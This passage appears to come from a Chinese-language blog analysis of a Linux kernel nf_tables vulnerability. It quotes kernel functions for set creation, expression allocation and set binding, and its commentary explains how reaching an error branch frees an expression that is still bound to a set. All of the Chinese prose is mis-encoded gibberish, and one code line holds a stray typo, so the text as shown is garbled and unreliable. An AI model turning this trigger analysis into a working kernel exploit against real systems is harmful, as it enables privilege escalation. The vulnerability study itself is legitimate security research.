class="keyword">if</span> (IS_ERR(ops))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(ops);</span><br><span class="line"></span><br><span class="line">udlen = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_USERDATA])</span><br><span class="line">udlen = nla_len(nla[NFTA_SET_USERDATA]);</span><br><span class="line"></span><br><span class="line">size = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;privsize != <span class="literal">NULL</span>)</span><br><span class="line">size = ops-&gt;privsize(nla, &amp;desc);</span><br><span class="line">alloc_size = <span class="keyword">sizeof</span>(*<span class="built_in">set</span>) + size + udlen;</span><br><span class="line"><span class="keyword">if</span> (alloc_size &lt; size || alloc_size &gt; INT_MAX)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"><span class="built_in">set</span> = kvzalloc(alloc_size, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">set</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">name = nla_strdup(nla[NFTA_SET_NAME], GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!name) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> err_set_name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = nf_tables_set_alloc_name(&amp;ctx, <span class="built_in">set</span>, name);</span><br><span class="line">kfree(name);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_set_name;</span><br><span class="line"></span><br><span class="line">udata = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (udlen) &#123;</span><br><span class="line">udata = <span class="built_in">set</span>-&gt;data + size;</span><br><span class="line">nla_memcpy(udata, nla[NFTA_SET_USERDATA], udlen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">INIT_LIST_HEAD(&amp;<span class="built_in">set</span>-&gt;bindings);</span><br><span class="line">INIT_LIST_HEAD(&amp;<span class="built_in">set</span>-&gt;catchall_list);</span><br><span class="line"><span class="built_in">set</span>-&gt;table = table;</span><br><span class="line">write_pnet(&amp;<span class="built_in">set</span>-&gt;net, net);</span><br><span class="line"><span class="built_in">set</span>-&gt;ops = ops;</span><br><span class="line"><span class="built_in">set</span>-&gt;ktype = ktype;</span><br><span class="line"><span class="built_in">set</span>-&gt;klen = desc.klen;</span><br><span class="line"><span class="built_in">set</span>-&gt;dtype = dtype;</span><br><span class="line"><span class="built_in">set</span>-&gt;objtype = objtype;</span><br><span class="line"><span class="built_in">set</span>-&gt;dlen = desc.dlen;</span><br><span class="line"><span class="built_in">set</span>-&gt;flags = flags;</span><br><span class="line"><span class="built_in">set</span>-&gt;size = desc.size;</span><br><span class="line"><span class="built_in">set</span>-&gt;policy = policy;</span><br><span class="line"><span class="built_in">set</span>-&gt;udlen = udlen;</span><br><span class="line"><span class="built_in">set</span>-&gt;udata = udata;</span><br><span class="line"><span class="built_in">set</span>-&gt;timeout = timeout;</span><br><span class="line"><span class="built_in">set</span>-&gt;gc_int = gc_int;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>-&gt;field_count = desc.field_count;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; desc.field_count; i++)</span><br><span class="line"><span class="built_in">set</span>-&gt;field_len[i] = desc.field_len[i];</span><br><span class="line"></span><br><span class="line">err = ops-&gt;init(<span class="built_in">set</span>, &amp;desc, nla);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_set_init;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_EXPR]) &#123;</span><br><span class="line">expr = nft_set_elem_expr_alloc(&amp;ctx, <span class="built_in">set</span>, nla[NFTA_SET_EXPR]);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(expr)) &#123;</span><br><span class="line">err = PTR_ERR(expr);</span><br><span class="line"><span class="keyword">goto</span> err_set_expr_alloc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">set</span>-&gt;exprs[<span class="number">0</span>] = expr;</span><br><span class="line"><span class="built_in">set</span>-&gt;num_exprs++;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nla[NFTA_SET_EXPRESSIONS]) &#123;</span><br><span class="line">struct nft_expr *expr;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tmp</span>;</span></span><br><span class="line"><span class="keyword">int</span> left;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_EXPR)) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> err_set_expr_alloc;</span><br><span class="line">&#125;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">nla_for_each_nested (tmp, nla[NFTA_SET_EXPRESSIONS], left) &#123;</span><br><span class="line"><span class="keyword">if</span> (i == NFT_SET_EXPR_MAX) &#123;</span><br><span class="line">err = -E2BIG;</span><br><span class="line"><span class="keyword">goto</span> err_set_expr_alloc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nla_type(tmp) != NFTA_LIST_ELEM) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> err_set_expr_alloc;</span><br><span class="line">&#125;</span><br><span class="line">expr = nft_set_elem_expr_alloc(&amp;ctx, <span class="built_in">set</span>, tmp);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(expr)) &#123;</span><br><span class="line">err = PTR_ERR(expr);</span><br><span class="line"><span class="keyword">goto</span> err_set_expr_alloc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">set</span>-&gt;exprs[i++] = expr;</span><br><span class="line"><span class="built_in">set</span>-&gt;num_exprs++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>-&gt;handle = nf_tables_alloc_handle(table);</span><br><span class="line"></span><br><span class="line">err = nft_trans_set_add(&amp;ctx, NFT_MSG_NEWSET, <span class="built_in">set</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_set_expr_alloc;</span><br><span class="line"></span><br><span class="line">list_add_tail_rcu(&amp;<span class="built_in">set</span>-&gt;<span class="built_in">list</span>, &amp;table-&gt;sets);</span><br><span class="line">table-&gt;use++;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_set_expr_alloc:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">set</span>-&gt;num_exprs; i++)</span><br><span class="line">nft_expr_destroy(&amp;ctx, <span class="built_in">set</span>-&gt;exprs[i]);</span><br><span class="line"></span><br><span class="line">ops-&gt;destroy(<span class="built_in">set</span>);</span><br><span class="line">err_set_init:</span><br><span class="line">kfree(<span class="built_in">set</span>-&gt;name);</span><br><span class="line">err_set_name:</span><br><span class="line">kvfree(<span class="built_in">set</span>);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ŠåŠéƒ¨åˆ†å¤„ç†<code>set</code>çš„è·Ÿæ¼æ´å…³ç³»ä¸å¤§ï¼Œä¸»è¦å…³æ³¨ä¸‹é¢ç”Ÿæˆ<code>expression</code>çš„è¿‡ç¨‹ï¼Œè¿™é‡Œä½¿ç”¨äº†<code>nft_set_elem_expr_alloc</code>å‡½æ•°è¿›è¡Œç”³è¯·ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct nft_expr *<span class="title">nft_set_elem_expr_alloc</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> struct nlattr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;e</span><br><span class="line"></span><br><span class="line">expr = nft_expr_init(ctx, attr);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(expr))</span><br><span class="line"><span class="keyword">return</span> expr;</span><br><span class="line"></span><br><span class="line">err = -EOPNOTSUPP;</span><br><span class="line"><span class="keyword">if</span> (!(expr-&gt;ops-&gt;type-&gt;flags &amp; NFT_EXPR_STATEFUL))</span><br><span class="line"><span class="keyword">goto</span> err_set_elem_expr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (expr-&gt;ops-&gt;type-&gt;flags &amp; NFT_EXPR_GC) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_TIMEOUT)</span><br><span class="line"><span class="keyword">goto</span> err_set_elem_expr;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">set</span>-&gt;ops-&gt;gc_init)</span><br><span class="line"><span class="keyword">goto</span> err_set_elem_expr;</span><br><span class="line"><span class="built_in">set</span>-&gt;ops-&gt;gc_init(<span class="built_in">set</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> expr;</span><br><span class="line"></span><br><span class="line">err_set_elem_expr:</span><br><span class="line">nft_expr_destroy(ctx, expr);</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å‡½æ•°å¼€å¤´å°±è°ƒç”¨äº†<code>nft_expr_init</code>è¿›è¡Œåˆå§‹åŒ–ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct nft_expr *<span class="title">nft_expr_init</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nlattr *nla)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_info</span> <span class="title">expr_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = nf_tables_expr_parse(ctx, nla, &amp;expr_info);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_expr_parse;</span><br><span class="line"></span><br><span class="line">err = -EOPNOTSUPP;</span><br><span class="line"><span class="keyword">if</span> (!(expr_info.ops-&gt;type-&gt;flags &amp; NFT_EXPR_STATEFUL))</span><br><span class="line"><span class="keyword">goto</span> err_expr_stateful;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">expr = kzalloc(expr_info.ops-&gt;size, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (expr == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> err_expr_stateful;</span><br><span class="line"></span><br><span class="line">err = nf_tables_newexpr(ctx, &amp;expr_info, expr);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_expr_new;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> expr;</span><br><span class="line">err_expr_new:</span><br><span class="line">kfree(expr);</span><br><span class="line">err_expr_stateful:</span><br><span class="line">owner = expr_info.ops-&gt;type-&gt;owner;</span><br><span class="line"><span class="keyword">if</span> (expr_info.ops-&gt;type-&gt;release_ops)</span><br><span class="line">expr_info.ops-&gt;type-&gt;release_ops(expr_info.ops);</span><br><span class="line"></span><br><span class="line">module_put(owner);</span><br><span class="line">err_expr_parse:</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå°±å‡ºç°äº†æˆ‘ä»¬æ¯”è¾ƒç†Ÿæ‚‰çš„ä¸¤ä¸ªå‡½æ•°äº†<code>nf_tables_expr_parse</code>ï¼Œ<code>nf_tables_newexpr</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> &#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_ops</span>*<span class="title">ops</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>data[]</span><br><span class="line">__attribute__((aligned(__alignof__(u64))));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">nft_expr_priv</span><span class="params">(<span class="keyword">const</span> struct nft_expr *expr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">void</span> *)expr-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_lookup_init</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> struct nft_expr *expr,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> tb[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_lookup</span> *<span class="title">priv</span> =</span> nft_expr_priv(expr);</span><br><span class="line">u8 genmask = nft_genmask_next(ctx-&gt;net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set</span> *<span class="title">set</span>;</span></span><br><span class="line">u32 flags;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tb[NFTA_LOOKUP_SET] == <span class="literal">NULL</span> ||</span><br><span class="line">    tb[NFTA_LOOKUP_SREG] == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> = nft_set_lookup_global(ctx-&gt;net, ctx-&gt;table, tb[NFTA_LOOKUP_SET],</span><br><span class="line">    tb[NFTA_LOOKUP_SET_ID], genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">set</span>))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">set</span>);</span><br><span class="line"></span><br><span class="line">err = nft_parse_register_load(tb[NFTA_LOOKUP_SREG], &amp;priv-&gt;sreg,</span><br><span class="line">      <span class="built_in">set</span>-&gt;klen);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tb[NFTA_LOOKUP_FLAGS]) &#123;</span><br><span class="line">flags = ntohl(nla_get_be32(tb[NFTA_LOOKUP_FLAGS]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; ~NFT_LOOKUP_F_INV)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; NFT_LOOKUP_F_INV) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_MAP)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">priv-&gt;invert = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tb[NFTA_LOOKUP_DREG] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (priv-&gt;invert)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (!(<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_MAP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">err = nft_parse_register_store(ctx, tb[NFTA_LOOKUP_DREG],</span><br><span class="line">       &amp;priv-&gt;dreg, <span class="literal">NULL</span>, <span class="built_in">set</span>-&gt;dtype,</span><br><span class="line">       <span class="built_in">set</span>-&gt;dlen);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_MAP)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">priv-&gt;binding.flags = <span class="built_in">set</span>-&gt;flags &amp; NFT_SET_MAP;</span><br><span class="line"></span><br><span class="line">err = nf_tables_bind_set(ctx, <span class="built_in">set</span>, &amp;priv-&gt;binding);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">priv-&gt;<span class="built_in">set</span> = <span class="built_in">set</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§ä¸Šé¢çš„åˆ†ææ­¤æ—¶å°±è¯¥è°ƒç”¨<code>nft_lookup_init</code>å‡½æ•°äº†ï¼Œè¿™é‡Œä¸»è¦éœ€è¦æ³¨æ„çš„æ˜¯æœ€åä¸€æ­¥æ“ä½œï¼Œå°±æ˜¯å°†<code>priv</code>ç»‘å®šåˆ°<code>set</code>ä¸Šã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_add_rcu(struct list_head *<span class="keyword">new</span>,</span><br><span class="line">struct list_head *prev, struct list_head *next)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!__list_add_valid(<span class="keyword">new</span>, prev, next))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span>-&gt;next = next;</span><br><span class="line"><span class="keyword">new</span>-&gt;prev = prev;</span><br><span class="line">rcu_assign_pointer(list_next_rcu(prev), <span class="keyword">new</span>);</span><br><span class="line">next-&gt;prev = <span class="keyword">new</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_add_tail_rcu</span><span class="params">(struct list_head *<span class="keyword">new</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">struct list_head *head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__list_add_rcu(<span class="keyword">new</span>, head-&gt;prev, head);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_binding</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">list</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span>*<span class="title">chain</span>;</span></span><br><span class="line">u32flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_lookup</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set</span>*<span class="title">set</span>;</span></span><br><span class="line">u8sreg;</span><br><span class="line">u8dreg;</span><br><span class="line"><span class="keyword">bool</span>invert;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_binding</span><span class="title">binding</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nf_tables_bind_set</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">       struct nft_set_binding *binding)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_binding</span> *<span class="title">i</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_iter</span> <span class="title">iter</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">set</span>-&gt;use == UINT_MAX)</span><br><span class="line"><span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!list_empty(&amp;<span class="built_in">set</span>-&gt;bindings) &amp;&amp; nft_set_is_anonymous(<span class="built_in">set</span>))</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (binding-&gt;flags &amp; NFT_SET_MAP) &#123;</span><br><span class="line"><span class="comment">/* If the set is already bound to the same chain all</span></span><br><span class="line"><span class="comment"> * jumps are already validated for that chain.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">list_for_each_entry (i, &amp;<span class="built_in">set</span>-&gt;bindings, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (i-&gt;flags &amp; NFT_SET_MAP &amp;&amp;</span><br><span class="line">    i-&gt;chain == binding-&gt;chain)</span><br><span class="line"><span class="keyword">goto</span> bind;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">iter.genmask = nft_genmask_next(ctx-&gt;net);</span><br><span class="line">iter.skip = <span class="number">0</span>;</span><br><span class="line">iter.count = <span class="number">0</span>;</span><br><span class="line">iter.err = <span class="number">0</span>;</span><br><span class="line">iter.fn = nf_tables_bind_check_setelem;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>-&gt;ops-&gt;walk(ctx, <span class="built_in">set</span>, &amp;iter);</span><br><span class="line"><span class="keyword">if</span> (!iter.err)</span><br><span class="line">iter.err = nft_set_catchall_bind_check(ctx, <span class="built_in">set</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (iter.err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> iter.err;</span><br><span class="line">&#125;</span><br><span class="line">bind:</span><br><span class="line">binding-&gt;chain = ctx-&gt;chain;</span><br><span class="line">list_add_tail_rcu(&amp;binding-&gt;<span class="built_in">list</span>, &amp;<span class="built_in">set</span>-&gt;bindings);</span><br><span class="line">nft_set_trans_bind(ctx, <span class="built_in">set</span>);</span><br><span class="line"><span class="built_in">set</span>-&gt;use++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å›åˆ°<code>nft_set_elem_expr_alloc</code>å‡½æ•°ä¸­è‹¥æ˜¯æˆ‘ä»¬æ§åˆ¶èµ°å‘<code>err_set_elem_expr</code>åˆ†æ”¯å³å¯é”€æ¯<code>expr</code>ã€‚</p><p>å½“<code>if (!(expr-&gt;ops-&gt;type-&gt;flags &amp; NFT_EXPR_STATEFUL))</code>æ»¡è¶³æ˜¯ä¼šè¿›å…¥åˆ°<code>err_set_elem_expr</code>åˆ†æ”¯ä¸­ï¼Œæ­£å¥½æˆ‘ä»¬ä½¿ç”¨çš„<code>type</code>ä¸­æ˜¯ä¸å­˜åœ¨è¿™ä¸ªä¸œè¥¿çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nf_tables_destroy_set</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span 